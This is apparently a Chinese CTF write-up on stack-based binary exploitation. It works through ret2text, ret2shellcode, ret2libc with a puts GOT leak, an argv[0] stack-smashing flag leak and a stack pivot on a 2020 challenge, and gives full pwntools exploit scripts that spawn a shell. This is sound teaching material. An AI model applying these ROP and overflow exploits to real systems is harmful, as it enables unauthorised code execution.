[toc]

# 基础-`ret2text`

##  题目分析

首先看看程序的`checksec`

```shell
hjc@Chernobyl-Surface:~/stack_learn/ret2_text$ checksec pwn1
[*] '/home/hjc/stack_learn/ret2_text/pwn1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

栈上无`canary`保护，程序无PIE，可以尝试通过覆写返回地址来达到控制执行流程。拖进`IDA`分析，发现程序中内置了`getshell`函数：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813223919224.png" alt="image-20200813223919224" style="zoom:50%;" />

程序中执行输入的`vuln`的反汇编代码如下：

```cpp
__int64 vuln()
{
  char v1; // [rsp+0h] [rbp-10h]

  printf("Input:");
  return _isoc99_scanf((__int64)"%s", (__int64)&v1);
}
```

可以利用`scanf`进行栈溢出，覆写`rip`地址为`getshell`地址。从`ida`的反汇编代码可以看出，变量`v1`的地址位于`rbp-0x10`的位置，那么`payload`就可以由以下部分组成：大小为`0x10`的数据填充`v1`，8字节指针覆盖`rsp`，最后8字节指针覆盖`rip`，跳转至`getshell()`。设计一个简单的`payload = 'A'*0x10+p64(0xdeadbeef)+p64(&getshell)`

## 调试分析

连上`gdb`调试，在执行`scanf`前，指令流、堆栈和寄存器信息如图：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813230534367.png" alt="image-20200813230534367" style="zoom:40%;" />

执行`payload`后，程序信息如图。可以看到，从`rsp`至`rbp`之间的空间都被`A`填满，`rbp`被覆盖为`0xdeadbeef`，`rip`被覆写为`getshell`的函数地址。反汇编窗口也呈现程序在执行完`ret`后会进入到`getshell`函数中。

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813231630169.png" alt="image-20200813231630169" style="zoom:40%;" />

## POC

```python
p = process('./pwn1')
#lauch_gdb(p)
#pause()
payload = 'A'*0x10
payload += p64(0xdeadbeef)#rbp
payload += p64(0x400686)#rip -> getshell
p.sendlineafter('Input:',payload)
p.interactive()
```

# `bss`段利用-`ret2shellcode`

## 题目分析

程序的`checksec`信息如下：

```shell
 '/home/hjc/stack_learn/ret2_shellcode/pwn2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

基本上什么保护都没开，拖进`ida`康康：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813232855061.png" alt="image-20200813232855061" style="zoom:50%;" /><img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813232925303.png" alt="image-20200813232925303" style="zoom:50%;" />

`vuln`函数可以利用变量`v1`进行栈溢出覆写返回地址，但程序中并未提供`shell`方法，需要自己动手丰衣足食。通过观察发现变量`name`位于`bss`段，且该段具有读写执行权限。如此即可利用第一次`read`方法将`shellcode`部署入`name`所在的地址中，第二部分通过栈溢出来将返回地址修改为`name`地址以执行`shellcode`。`poc`思路如下：

```python
sh = generate_shellcode()#生成shellcode
name = read(sh)
payload = 'A'*0x20#填充v1
payload += p64(0xdeadbeef)#rbp
payload += p64(&name)#跳转至shellcode
```

## 调试分析

在`gdb`调试器中，第一次`read`执行完毕后，`bss`段的`name`内容被填充为`shellcode`：

![image-20200813234411658](https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813234411658.png)

执行gets函数前：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813234614082.png" alt="image-20200813234614082" style="zoom:40%;" />

执行`gets`函数后，`rip`已被覆写为`name`地址：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813234711503.png" alt="image-20200813234711503" style="zoom:40%;" />

函数返回后跳转至`shellcode`中：

![image-20200813234951524](https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200813234951524.png)

## POC

```python
from pwn import *
context.arch = 'amd64'#指定架构

p = process('./pwn2')
shellcode = asm(shellcraft.sh())#构造shellcode
p.sendafter('Name:',shellcode)
payload = 'A'*0x20
payload += p64(0xdeadbeef)#rbp
payload += p64(0x601040)#rip 程序执行流跳转到bss段的name，可控
p.sendlineafter('Input:',payload)
p.interactive()
```

# 构造`ROP`-`ret2libc`

## 题目分析

程序`checksec`信息如下：

```shell
[*] '/home/hjc/stack_learn/ret2_libc/pwn3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

拖进`ida`康康，与上一题类似，也是两个变量，两种数据段。不同的是这次`name`的数据段没有执行权限：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814004510494.png" alt="image-20200814004510494" style="zoom:50%;" />

![image-20200814004554740](https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814004554740.png)

一没可利用的程序自定函数，二没可写可执行的数据段，不过程序未开启`Canary`和`PIE`，意味着程序指令地址是固定的，且栈的返回地址可控，`got`表也在，在这种情况下可以尝试手动构造`rop`来`getshell`。

`rop`的思路是借助程序中自带的指令来劫持程序的数据流。在`Linux x64`环境下，默认通过寄存器来传递前几个参数，自左向右第一个参数放入寄存器`rdi`。如果程序中自带了`pop rdi`和`ret`指令，就可以将栈上的数据传入寄存器中，寄存器的值作为参数传递入可控的地址中，由此实现可控的参数与函数调用，比如`system('\bin\sh')`。

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814095958082.png" alt="image-20200814095958082" style="zoom:50%;" />

在程序中找到了连续`pop`+`ret`的片段，但是并没有`pop rdi`的指令存在。这时可以通过指令拆分进行构造，从`0x400712`开始的汇编指令为`pop r15;ret`，但是从`0x400713`开始执行，就变成了`pop rdi;ret`：

![image-20200814100923311](https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814100923311.png)

如何确定跳转的地址？`Linux`中存在一种称为`lazy reload`的机制，将库中的函数地址存储于`plt`表与`got`表中。在进行第一次系统库函数调用时`plt`表无函数地址，系统会进入`got`表中查询库函数真实地址，然后将其放入`plt`表中，第二次调用时直接从`plt`表中跳转至库函数。

![img](https://pic002.cnblogs.com/images/2011/354818/2011121011241570.png)

系统中每个库函数的地址都是相对库基址进行一定偏移所得，因此我们可以利用输出函数`puts`将`libc`的基址泄露出来，利用思路如下：

```python
payload  = 'A'*0x10v #=> stack
payload += p64(0xdeadbeef) # => RBP
payload += p64(0x400713) # => RIP 
payload += got['puts']# => RDI
payload += plt['puts']# => RIP => puts(got['puts'])
payload += addr_of_vuln #程序执行流回到vuln，利用gets函数再次进行操作
```

## 调试分析

在调用`gets`前，程序执行流如下：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814102030969.png" alt="image-20200814102030969" style="zoom:40%;" />

调用`gets`后，程序执行流被劫持至`pop rdi`部分：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814102237924.png" alt="image-20200814102237924" style="zoom:40%;" />

进入`0x400713`，此时栈上的元素排布自上往下依次为：`puts`在库函数的位置，`puts`函数地址，`vlun`地址。程序首先执行`pop rdi`，将`puts`地址作为传入参数，然后`ret`指令将栈顶`puts`函数地址传入`rip`，调用`puts`函数输出地址。同时可以观察到，在跳转入`plt['got']`时有一条`jmp`指令，即`puts`已经被执行过一次，其真实地址已存入`plt`中，直接跳转即可：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814102749139.png" alt="image-20200814102749139" style="zoom:40%;" />

根据程序流劫持泄露出了`puts`的函数地址，`libc`基址的计算方式为：` libc基址= 泄露puts地址 - 库内偏移`

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814103259374.png" alt="image-20200814103259374" style="zoom:50%;" />

在`puts`函数返回时，栈顶元素为我们之前布置的`vlun`地址，程序在弹栈后将跳转回`vuln`，再次调用`gets`进行进一步的操作：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814103435776.png" alt="image-20200814103435776" style="zoom:40%;" />

有了`libc`基址就可以通过固定偏移计算`system`函数的地址和`/bin/sh`字符串的位置，然后如前面劫持调用`puts`一样构造`system('/bin/sh')`调用，利用思路如下：

```python
payload  = 'A'*0x10v #=> stack
payload += p64(0xdeadbeef) # => RBP
payload += p64(0x400713) # => RIP 
payload += addr_of('/bin/sh')# => RDI
payload += addr_of_system() # => RIP => system('/bin/sh')
```

程序执行`pop rdi;ret`指令后，控制流信息如图，即将执行`system('/bin/sh')`流程：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814104006855.png" alt="image-20200814104006855" style="zoom:40%;" />

## POC

```python
#coding:UTF-8
#NX开启，通过gadget控制寄存器传参至程序目标函数
from pwn import *
context.log_level = 'debug'
def lauch_gdb(p):
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(p)

def lauch_with_gdb(filename):
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']
    p=gdb.debug(filename,"break main")
    return p

p = process('./pwn3')
#p = lauch_with_gdb('./pwn3')
elf = ELF('./pwn3')
libc = elf.libc

vuln_addr = 0x400626
main_addr = 0x40064c

#执行某一次函数后，GOT表会存储一个函数在程序中的偏移地址
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
rdi_ret = 0x400713
#lauch_gdb(p)
#pause()

payload = 'A'*0x10
payload += p64(0xdeadbeef)#rbp

#第一次rop 泄露libc基址。只能泄露已经执行过一次的函数的libc地址

payload += p64(rdi_ret) # rip -> gadget地址
payload += p64(puts_got) #pop rdi -> 泄露puts地址 = libc基址+库内偏移
payload += p64(puts_plt) #ret->pop rip ->into puts
payload += p64(vuln_addr) #puts返回 -> final pos

p.sendlineafter('Input:\n',payload)


content = p.readline()[:-1]
libc_base = u64(content.ljust(8,'\x00')) - libc.sym['puts']#计算libc基址
log.info('libc_base:'+hex(libc_base))

system_addr = libc_base + libc.sym['system']#system函数地址
binsh_addr = libc_base + libc.search('/bin/sh').next()#字符串地址

#第二次rop 劫持流程
payload = 'B' * 0x10
payload += p64(0xdeadbeef)
payload += p64(rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendlineafter('Input:\n',payload)
p.interactive()
```

# 利用程序崩溃信息-`smashing`

## 题目分析

程序`checksec`信息如下

```shell
[*] '/home/hjc/stack_learn/smashing/smashing'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

除了`PIE`保护全开，在开启`Canary`的情况下直接执行栈溢出需要爆破`Canary`的值，难以利用。`main`函数伪代码如下：

```cpp
ssize_t init()
{
  int fd; // ST0C_4

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  fd = open("./flag", 0);
  return read(fd, &flag, 0x30uLL);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int fd; // ST1C_4
  char s; // [rsp+20h] [rbp-50h]
  char s1; // [rsp+40h] [rbp-30h]
  unsigned __int64 v7; // [rsp+68h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(*(_QWORD *)&argc, argv, envp);
  memset(&s, 0, 0x20uLL);
  memset(&s, 0, 0x20uLL);
  fd = open("/dev/urandom", 0);
  read(fd, &s, 8uLL);
  puts("Passwd:");
  gets(&s1, &s);
  if ( !strcmp(&s1, &s) )
    printf("flag: %s\n", &flag);
  else
    puts("error!");
  return 0;
}
```

程序在开始会读入`flag`到一个变量中，到每次需要输入一个数与随机数比对，正确后才能输出`flag`内容，爆破难度极大。随便输入一下看看有啥提示

```shell
hjc@Chernobyl-Surface:~/stack_learn/smashing$ cyclic 150
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
hjc@Chernobyl-Surface:~/stack_learn/smashing$ ./smashing
Passwd:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
error!
*** stack smashing detected ***: ./smashing terminated
Aborted
```

程序在崩溃时会提示程序终止，程序名称位于`argv[0]`参数中，加大力度试试：

```shell
hjc@Chernobyl-Surface:~/stack_learn/smashing$ cyclic 280
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaac
hjc@Chernobyl-Surface:~/stack_learn/smashing$ ./smashing
Passwd:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaac
error!
*** stack smashing detected ***:  terminated
Aborted
```

报错输出里面的程序名称不见了，可以确定输入的数据能覆写到`argv[0]`。据此，漏洞利用的思路为：`PIE`未开启，程序的指令数据的内存位置固定，可以覆写栈一路直到`argv[0]`的地址，然后把`flag`的地址放上去。

## 调试分析

在`gets()`前下断点，`rdi`寄存器的值为写入缓冲区的地址；也可以在`gets()`的函数栈中用`info args`来查看参数：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814133416462.png" alt="image-20200814133416462" style="zoom:50%;" />

浏览栈数据，根据程序名称确定`argb[0]`的地址：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814133445426.png" alt="image-20200814133445426" style="zoom:50%;" />

写入缓冲区起始地址为` 0x7ffe95dc7e50`，`argv[0]`的地址为` 0x7ffe95dc7f68 `，相对偏移为`0x118`。据此可以写个简单的`payload = 'A'*0x118+addr_of(flag)`。执行payload后` 0x7ffe95dc7f68 `的内容由原来的`argv[0]`被覆写为`flag`的内容：

<img src="https://raw.githubusercontent.com/Pryriat/blog_backup/master/Image/stack_learn/image-20200814133604970.png" alt="image-20200814133604970" style="zoom:50%;" />

程序继续执行会报错，错误信息中会输出`flag`的内容：

```shell
[DEBUG] Received 0x45 bytes:
    'error!\n'
    '*** stack smashing detected ***: flag{YOU_GOT_IT}\n'
    ' terminated\n'
error!
*** stack smashing detected ***: flag{YOU_GOT_IT}
 terminated
[*] Got EOF while reading in interactive
```

## POC

```python
from pwn import *

p = process('./smashing')

flag_addr = 0x6010a0

payload = '\x00'*0x118
payload += p64(flag_addr)
p.sendlineafter('Passwd:',payload)
p.interactive()
```

# 栈迁移-`babymessage`

## 题目分析

程序`checksec`信息如下：

```shell
[*] '/home/hjc18/PWN/qwb2020/babymessage/babymessage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
```

只开了`NX`，没有`Canary`和`PIE`。

`main`函数的逻辑是经典的菜单题：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  menu();
  work();
  return 0;
}
```

`work`是程序的主流程函数，几个`while/break`看起来好像云里雾里，实际上是一个简单的`switch`逻辑。通过输入`mm`来切换执行的流程，那么相应的，传入的参数也被`mm`所控制。不过细看程序逻辑，`v1`的类型为`signed int`，`leave_message`前`v1`的校验逻辑只包含上界而无下界，意味着`v1`为负可以绕过第一个校验——由此产生一个思路：如何通过修改`v1`来控制传入参数：

```cpp
__int64 work()
{
  signed int v1; // [rsp+Ch] [rbp-4h]

  buf = (char *)malloc(0x100uLL);
  v1 = mm + 0x10;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts("choice: ");
          __isoc99_scanf("%d", &mm);
          if ( mm != 1 )
            break;
          leave_name();
        }
        if ( mm != 2 )
          break;
        if ( v1 > 0x100 )//incomplete arg check!! 
          v1 = 256;
        leave_message(v1);//v1 was controled by mm => 0x12
      }
      if ( mm != 3 )
        break;
      show(v1);//v1 was controled by mm => 0x13
    }
    if ( mm == 4 )
      break;
    puts("invalid choice");
  }
  return 0LL;
}
```

`leave_name`的作用为改写`BSS`段上的`name`变量，不过程序开启了`NX`，无法利用`ret2shellcode`；限制了`name`的读取长度为4：

```cpp
__int64 leave_name()
{
  puts("name: ");
  name[(signed int)read(0, name, 4uLL)] = 0; 
  puts("done!\n");
  return 0LL;
}

# BSS
.bss:00000000006010D0 name            db 10h dup(?)           ; DATA XREF: leave_name+15↑o
.bss:00000000006010D0                                         ; leave_name+2E↑o ...
.bss:00000000006010D0 _bss            ends
```

`leave_message`将用户的输入读入至栈上的缓冲区，长度限制为传入的参数——注意，传入的参数类型为`unsigned int`，由先前的分析，如果传入`v1`的值为负，转换后的长度限制将非常大。这个点跟`work`里的负数溢出思路对应，看来方向没错。如果不修改`v1`的值，输入的长度限制为`0x12`，刚好够溢出`RBP`加上`RIP`的低4个字节。不过程序内部没有`get_shell`函数，`RIP`四个字节不够用：

```cpp
__int64 __fastcall leave_message(unsigned int size)
{
  int v1; // ST14_4
  __int64 stack_buffer; // [rsp+18h] [rbp-8h]

  puts("message: ");
  v1 = read(0, &stack_buffer, size);            // size = 0x12
  strncpy(buf, (const char *)&stack_buffer, v1);
  buf[v1] = 0;
  puts("done!\n");
  return 0LL;
}
```

`show`函数打印`name`和用户输入`buffer`的内容：

```cpp
__int64 __fastcall show(unsigned int a1)
{
  printf("%s says: ", name);
  write(1, buf, a1);
  return 0LL;
}
```

## 调试分析

初看起来是负数溢出，可是`v1`的值与`switch`绑定，没找到其他的修改方法。随手输入十几个字符试试，发现`crash`现场的`RBP`刚好被我们的输入覆盖了：

```assembly
Starting program: /home/hjc18/PWN/qwb2020/babymessage/babymessage
Welcome to message system!
1. leave name
2. leave message
3. show message
4. exit
choice:
2
message:
ssssssssssssssssssssssssssssssssssssssssss
done!

# crash
RBP  0x7373737373737373 ('ssssssss')
RSP  0x7fffffffdc20 —▸ 0x7fffffffdd20 ◂— 0x1
RIP  0x400985 (work+107) ◂— cmp    dword ptr [rbp - 4], 0x100
```

恍然大悟，看了看`leave_message`的汇编，`leave_ret`组合拳：

```assembly
.text:000000000040086F                 add     rax, rdx
.text:0000000000400872                 mov     byte ptr [rax], 0
.text:0000000000400875                 lea     rdi, aDone      ; "done!\n"
.text:000000000040087C                 call    _puts
.text:0000000000400881                 mov     eax, 0
.text:0000000000400886                 leave  <- target!
.text:0000000000400887                 retn
.text:0000000000400887 ; } // starts at 40080A
```

这样一来可以用栈迁移的方法修改`v1`，覆盖`RBP`至`BSS`段的`name`变量，将`name`的数据解析成`v1`，继而修改`leave_message`的写入长度，将返回地址覆写为`puts`，获取基址的方法与`ret2libc`相同：

```shell
# shell
[DEBUG] Received 0x5b bytes:
    'Welcome to message system!\n'
    '1. leave name\n'
    '2. leave message\n'
    '3. show message\n'
    '4. exit\n'
    'choice: \n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x7 bytes:
    'name: \n'
[DEBUG] Sent 0x4 bytes:
    00000000  50 00 00 0f => name: 0xf0000050

# mod_rbp
[DEBUG] Received 0x9 bytes:
    'choice: \n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0xa bytes:
    'message: \n'
[DEBUG] Sent 0x10 bytes:
    00000000  41 41 41 41  41 41 41 41  d4 10 60 00  00 00 00 00  => overflow rbp to 0x6010d4(name+4)
    
# reg
rsi  0x7ffc9311ac88 -> 0x4141414141414141 ('AAAAAAAA')
rbp  0x7ffc9311ac90 -> 0x6010d4 (mm+20) 

#assembly
0x400985 <work+107>    cmp    dword ptr [rbp - 4], 0x100 -> rbp-4 -> name
0x40098c <work+114>    jle    work+123 <0x400995> ->pass the check

# modify the length of strncpy
<leave_message+84>     call   strncpy@plt <0x400660>
dest: 0x1c06260 -> 0x4141414141414141 ('AAAAAAAA')
src: 0x7ffc9311ac88 -> 0x4141414141414141 ('AAAAAAAA')
n: 0x30

# stack_overflow to got
rsp  0x7ffc9311ac98 -> 0x400ac3 (__libc_csu_init+99) <- pop    rdi
     0x7ffc9311aca0 -> 0x601020 (_GLOBAL_OFFSET_TABLE_+32) -> 0x7f207b79fa30 (puts) <- push   r13
     0x7ffc9311aca8 -> 0x400670 (puts@plt) -> jmp    qword ptr [rip + 0x2009aa]
     0x7ffc9311acb0 -> 0x40091a (work) -> push   rbp
     0x7ffc9311acb8 -> 0x400a4f (main+114) -> mov    eax, 0
```

## POC

```python
#coding:UTF-8

from pwn import *

def lauch_gdb(p):
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(p)

def lauch_with_gdb(filename):
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']
    p=gdb.debug(filename,"break main")
    return p

p = process('./babymessage')
elf = ELF('./babymessage')
libc = ELF('./libc-2.27.so')
#work_addr = 0x40093F -> libc2.23可以成功，但2.27会crash
main_addr = 0x40091A

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
rdi_ret = 0x400ac3

#lauch_gdb(p)
#pause()

payload = 'A'*0x8+p64(0x6010D4)
p.sendlineafter('choice:','1')
p.sendafter('name:',p32(0xf000050))
p.sendlineafter('choice:','2')
p.sendafter('message:',payload)
p.sendlineafter('choice:','2')
payload_2 = 'A'*0x8
payload_2 += p64(0x6010D4)


payload_2 += p64(rdi_ret) # rip -> gadget地址
payload_2 += p64(puts_got) #pop rdi -> 泄露puts地址 = libc基址+库内偏移
payload_2 += p64(puts_plt) #ret->pop rip ->into puts
payload_2 += p64(main_addr) #puts返回 -> final pos
p.sendafter('message:',payload_2)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = puts_addr- libc.sym['puts']#计算libc基址


system_addr = libc_base + libc.sym['system']#system函数地址
binsh_addr = libc_base + libc.search('/bin/sh').next()#字符串地址
log.info('libc_base:'+hex(libc_base))
log.info('system_base:'+hex(system_addr))
log.info('binsh_base:'+hex(binsh_addr))

#第二次rop 劫持流程
payload = 'A'*0x8+p64(0x6010D4)
p.sendlineafter('choice:','1')
p.sendafter('name:',p32(0xf000050))
p.sendlineafter('choice:','2')
p.sendafter('message:',payload)
p.sendlineafter('choice:','2')


#pause()
payload = 'A' * 0x8
payload += p64(0x6010D4)
payload += p64(libc_base+0x4f365)
p.sendafter('message:',payload)

p.interactive()

```



